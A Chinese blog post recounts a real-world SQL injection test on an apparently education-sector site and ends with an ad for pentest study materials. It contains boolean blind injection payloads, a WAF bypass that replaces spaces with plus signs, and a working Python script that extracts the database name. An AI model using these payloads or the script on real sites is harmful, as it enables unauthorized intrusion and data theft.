# 原创
：  实战 | SQL注入漏洞

# 实战 | SQL注入漏洞

在页面参数增加 and -1=-1，页面回显正常<br/> 这里如果 and 1=1 会被拦截

---


然后尝试-1=-2<br/> 页面报错，此处存在数字型sql注入漏洞

---


接下来就是查字段数<br/> order by 1<br/> 页面依旧报错

如果大家在渗透的时候遇到这种情况<br/> 要考虑是不是某些参数被拦截等

换一种思路，用盲注的思路走走看<br/> 不要到这里就直接放弃<br/> 觉得怎么现在还能存在数字型的注入漏洞这样<br/> 好歹能在edu赚点rank<br/> 换个证书

---


and length(database()) &gt; 1,页面正常

`and length(database())&gt;10,页面报错

这里是属于布尔盲注<br/> 接下来就是用2分法<br/> 找到长度<br/> 最后测试结果是6<br/> 然后测试一下能不能爆库名字符

---


然后再试试表名<br/> 如果表名字符也能出<br/> 这里数据也就能爆出来了<br/> 因为查表名的时候，表名就是从数据表中查询出来的结果

---


这里经过多次尝试<br/> 确认了过滤的内容是<br/> from%20 # %20就是空格<br/> 然后试着用%09,%0a,%0b,%0c等绕过都不可行<br/> 当我想要放弃的时候<br/> 一位学长跟我说用加号试试<br/> 我当时心里其实是非常不相信的，因为+在url编码里面<br/> 就是空格的意思，那空格被过滤了，+不也就被禁掉了吗<br/> 然后我出于礼貌的尝试了一下<br/> 发现成了，，，<br/> 所以还是谦虚一点好

---


这里至少没有被waf拦截<br/> 然后再继续尝试

这里的话把where语句去掉之后就可行了

然后写一个脚本去跑<br/> 脚本这里的话网址都删掉了，可以看看编写思路<br/> 这里用正则表达式，去看页面内容中是否存在`发布时间`这几个字符<br/> 存在的话就说明页面为True<br/> 不存在就是False<br/> 然后用了二分法<br/> 二分法的话可以参考我的这篇文章<br/> https://bbs.zkaq.cn/t/5506.html

```
# coding=gbk
import requests
import re


def isTrue(url):
    res = requests.get(url)
    if re.search("发布时间", res.text):
        return True


def get_length():
    for i in range(25):
        url = f"http://网址/site/article.php?cate=5&amp;cid=1&amp;aid=972%20and%20length(database())={i}"
        if isTrue(url):
            print(f"length: {i}")
            return i


def to_num1(url, num=1):
    # url &gt;
    if isTrue(url % num):
        return to_num1(url, num * 2)
    return [(num // 2) - 1, num]


def tow_num2(url, num_):

    c = (num_[1] + num_[0]) / 2
    if isTrue(url % c):  # 如果 大于 c成立 把最小值设置为中值
        # print(url % c)
        num_[0] = c
    else:
        num_[1] = c  # 否则设置最大值
    if num_[1] - num_[0] &lt;= 1:
        num_[1] = round(num_[1])
        return num_[1]
    return tow_num2(url, [num_[0], num_[1]])


def get_database():
    database_name = ''
    for i in range(1, get_length() + 1):
        url = f"http://网址/site/article.php?cate=5&amp;cid=1&amp;aid=972 and ascii(substr(database(),{i},1))&gt;%d"
        num1 = to_num1(url)
        num2 = tow_num2(url,num1)
        database_name += chr(num2)
    print("database:" + database_name)


if __name__ == '__main__':
    get_database()
```

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/d824363ce23d4083afc100c6aa5a2bd6.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f6d7400f17e9433eb0eb97713f16fccc.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/a9fe4c2617e64bd79e7c2a4699f1c282.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/4e815e5ef2844910b47b225c9f7dbcb4.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/954b3aafd02d4529b59325d4141ebb75.png" width="665"/>

应急响应笔记

学习路线
